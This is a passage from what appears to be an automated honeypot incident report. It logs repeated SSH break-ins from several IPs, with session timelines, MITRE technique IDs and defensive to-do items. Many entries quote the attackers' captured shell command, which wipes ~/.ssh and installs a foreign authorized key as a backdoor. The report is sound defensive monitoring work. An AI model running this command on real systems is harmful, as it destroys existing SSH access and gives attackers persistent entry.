| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:21:01` | `cowrie.session.connect` |
| `2026-05-20 20:21:01` | `cowrie.client.version` |
| `2026-05-20 20:21:02` | `cowrie.client.kex` |
| `2026-05-20 20:21:03` | `cowrie.login.success` |
| `2026-05-20 20:21:03` | `cowrie.session.params` |
| `2026-05-20 20:21:03` | `cowrie.command.input` |
| `2026-05-20 20:21:03` | `cowrie.command.failed` |
| `2026-05-20 20:21:04` | `cowrie.log.closed` |
| `2026-05-20 20:21:04` | `cowrie.session.params` |
| `2026-05-20 20:21:04` | `cowrie.command.input` |
| `2026-05-20 20:21:04` | `cowrie.session.file_download` |
| `2026-05-20 20:21:04` | `cowrie.log.closed` |
| `2026-05-20 20:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee79051041ee

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 20:21 |
| **Last Seen** | 2026-05-20 20:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:21:03` | `cowrie.session.connect` |
| `2026-05-20 20:21:03` | `cowrie.client.version` |
| `2026-05-20 20:21:03` | `cowrie.client.kex` |
| `2026-05-20 20:21:03` | `cowrie.login.success` |
| `2026-05-20 20:21:04` | `cowrie.session.params` |
| `2026-05-20 20:21:04` | `cowrie.command.input` |
| `2026-05-20 20:21:04` | `cowrie.command.failed` |
| `2026-05-20 20:21:04` | `cowrie.log.closed` |
| `2026-05-20 20:21:04` | `cowrie.session.params` |
| `2026-05-20 20:21:04` | `cowrie.command.input` |
| `2026-05-20 20:21:04` | `cowrie.session.file_download` |
| `2026-05-20 20:21:04` | `cowrie.log.closed` |
| `2026-05-20 20:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef5105eeabb

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:21 |
| **Last Seen** | 2026-05-20 20:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:21:07` | `cowrie.session.connect` |
| `2026-05-20 20:21:07` | `cowrie.client.version` |
| `2026-05-20 20:21:07` | `cowrie.client.kex` |
| `2026-05-20 20:21:07` | `cowrie.login.success` |
| `2026-05-20 20:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae8f0836701

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:21 |
| **Last Seen** | 2026-05-20 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:21:07` | `cowrie.session.connect` |
| `2026-05-20 20:21:07` | `cowrie.client.version` |
| `2026-05-20 20:21:07` | `cowrie.client.kex` |
| `2026-05-20 20:21:08` | `cowrie.login.success` |
| `2026-05-20 20:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22dced312ed9

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:22 |
| **Last Seen** | 2026-05-20 20:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:22:09` | `cowrie.session.connect` |
| `2026-05-20 20:22:09` | `cowrie.client.version` |
| `2026-05-20 20:22:09` | `cowrie.client.kex` |
| `2026-05-20 20:22:10` | `cowrie.login.success` |
| `2026-05-20 20:22:10` | `cowrie.session.params` |
| `2026-05-20 20:22:10` | `cowrie.command.input` |
| `2026-05-20 20:22:10` | `cowrie.command.failed` |
| `2026-05-20 20:22:11` | `cowrie.log.closed` |
| `2026-05-20 20:22:11` | `cowrie.session.params` |
| `2026-05-20 20:22:11` | `cowrie.command.input` |
| `2026-05-20 20:22:11` | `cowrie.session.file_download` |
| `2026-05-20 20:22:11` | `cowrie.log.closed` |
| `2026-05-20 20:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775f939f2308

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:22 |
| **Last Seen** | 2026-05-20 20:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:22:13` | `cowrie.session.connect` |
| `2026-05-20 20:22:13` | `cowrie.client.version` |
| `2026-05-20 20:22:13` | `cowrie.client.kex` |
| `2026-05-20 20:22:14` | `cowrie.login.success` |
| `2026-05-20 20:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea06f2e015e1

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:22 |
| **Last Seen** | 2026-05-20 20:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:22:23` | `cowrie.session.connect` |
| `2026-05-20 20:22:23` | `cowrie.client.version` |
| `2026-05-20 20:22:23` | `cowrie.client.kex` |
| `2026-05-20 20:22:24` | `cowrie.login.success` |
| `2026-05-20 20:22:25` | `cowrie.session.params` |
| `2026-05-20 20:22:25` | `cowrie.command.input` |
| `2026-05-20 20:22:25` | `cowrie.command.failed` |
| `2026-05-20 20:22:25` | `cowrie.log.closed` |
| `2026-05-20 20:22:25` | `cowrie.session.params` |
| `2026-05-20 20:22:25` | `cowrie.command.input` |
| `2026-05-20 20:22:26` | `cowrie.session.file_download` |
| `2026-05-20 20:22:26` | `cowrie.log.closed` |
| `2026-05-20 20:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e2fbedac7a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:22 |
| **Last Seen** | 2026-05-20 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:22:28` | `cowrie.session.connect` |
| `2026-05-20 20:22:28` | `cowrie.client.version` |
| `2026-05-20 20:22:29` | `cowrie.client.kex` |
| `2026-05-20 20:22:29` | `cowrie.login.success` |
| `2026-05-20 20:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef4f338dc495

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:24 |
| **Last Seen** | 2026-05-20 20:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:24:32` | `cowrie.session.connect` |
| `2026-05-20 20:24:32` | `cowrie.client.version` |
| `2026-05-20 20:24:32` | `cowrie.client.kex` |
| `2026-05-20 20:24:32` | `cowrie.login.success` |
| `2026-05-20 20:24:33` | `cowrie.session.params` |
| `2026-05-20 20:24:33` | `cowrie.command.input` |
| `2026-05-20 20:24:33` | `cowrie.command.failed` |
| `2026-05-20 20:24:33` | `cowrie.log.closed` |
| `2026-05-20 20:24:33` | `cowrie.session.params` |
| `2026-05-20 20:24:33` | `cowrie.command.input` |
| `2026-05-20 20:24:33` | `cowrie.session.file_download` |
| `2026-05-20 20:24:33` | `cowrie.log.closed` |
| `2026-05-20 20:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cedf1afcfcc0

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:24 |
| **Last Seen** | 2026-05-20 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:24:36` | `cowrie.session.connect` |
| `2026-05-20 20:24:36` | `cowrie.client.version` |
| `2026-05-20 20:24:36` | `cowrie.client.kex` |
| `2026-05-20 20:24:36` | `cowrie.login.success` |
| `2026-05-20 20:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa945dd7e7cc

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:25 |
| **Last Seen** | 2026-05-20 20:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:25:12` | `cowrie.session.connect` |
| `2026-05-20 20:25:12` | `cowrie.client.version` |
| `2026-05-20 20:25:13` | `cowrie.client.kex` |
| `2026-05-20 20:25:13` | `cowrie.login.success` |
| `2026-05-20 20:25:14` | `cowrie.session.params` |
| `2026-05-20 20:25:14` | `cowrie.command.input` |
| `2026-05-20 20:25:14` | `cowrie.command.failed` |
| `2026-05-20 20:25:14` | `cowrie.log.closed` |
| `2026-05-20 20:25:14` | `cowrie.session.params` |
| `2026-05-20 20:25:14` | `cowrie.command.input` |
| `2026-05-20 20:25:15` | `cowrie.session.file_download` |
| `2026-05-20 20:25:15` | `cowrie.log.closed` |
| `2026-05-20 20:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1998158009

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:25 |
| **Last Seen** | 2026-05-20 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:25:17` | `cowrie.session.connect` |
| `2026-05-20 20:25:17` | `cowrie.client.version` |
| `2026-05-20 20:25:18` | `cowrie.client.kex` |
| `2026-05-20 20:25:18` | `cowrie.login.success` |
| `2026-05-20 20:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86780b1614e9

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:26 |
| **Last Seen** | 2026-05-20 20:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:26:32` | `cowrie.session.connect` |
| `2026-05-20 20:26:32` | `cowrie.client.version` |
| `2026-05-20 20:26:33` | `cowrie.client.kex` |
| `2026-05-20 20:26:33` | `cowrie.login.success` |
| `2026-05-20 20:26:34` | `cowrie.session.params` |
| `2026-05-20 20:26:34` | `cowrie.command.input` |
| `2026-05-20 20:26:34` | `cowrie.command.failed` |
| `2026-05-20 20:26:34` | `cowrie.log.closed` |
| `2026-05-20 20:26:35` | `cowrie.session.params` |
| `2026-05-20 20:26:35` | `cowrie.command.input` |
| `2026-05-20 20:26:35` | `cowrie.session.file_download` |
| `2026-05-20 20:26:35` | `cowrie.log.closed` |
| `2026-05-20 20:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7909dafca8a5

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:26 |
| **Last Seen** | 2026-05-20 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:26:38` | `cowrie.session.connect` |
| `2026-05-20 20:26:38` | `cowrie.client.version` |
| `2026-05-20 20:26:38` | `cowrie.client.kex` |
| `2026-05-20 20:26:39` | `cowrie.login.success` |
| `2026-05-20 20:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6c1aa88dce

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:27 |
| **Last Seen** | 2026-05-20 20:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:27:54` | `cowrie.session.connect` |
| `2026-05-20 20:27:54` | `cowrie.client.version` |
| `2026-05-20 20:27:54` | `cowrie.client.kex` |
| `2026-05-20 20:27:55` | `cowrie.login.success` |
| `2026-05-20 20:27:56` | `cowrie.session.params` |
| `2026-05-20 20:27:56` | `cowrie.command.input` |
| `2026-05-20 20:27:56` | `cowrie.command.failed` |
| `2026-05-20 20:27:56` | `cowrie.log.closed` |
| `2026-05-20 20:27:56` | `cowrie.session.params` |
| `2026-05-20 20:27:56` | `cowrie.command.input` |
| `2026-05-20 20:27:57` | `cowrie.session.file_download` |
| `2026-05-20 20:27:57` | `cowrie.log.closed` |
| `2026-05-20 20:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8f75c669cd

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:28 |
| **Last Seen** | 2026-05-20 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:28:00` | `cowrie.session.connect` |
| `2026-05-20 20:28:00` | `cowrie.client.version` |
| `2026-05-20 20:28:00` | `cowrie.client.kex` |
| `2026-05-20 20:28:01` | `cowrie.login.success` |
| `2026-05-20 20:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d83794bea421

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:29 |
| **Last Seen** | 2026-05-20 20:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:29:16` | `cowrie.session.connect` |
| `2026-05-20 20:29:16` | `cowrie.client.version` |
| `2026-05-20 20:29:17` | `cowrie.client.kex` |
| `2026-05-20 20:29:18` | `cowrie.login.success` |
| `2026-05-20 20:29:18` | `cowrie.session.params` |
| `2026-05-20 20:29:18` | `cowrie.command.input` |
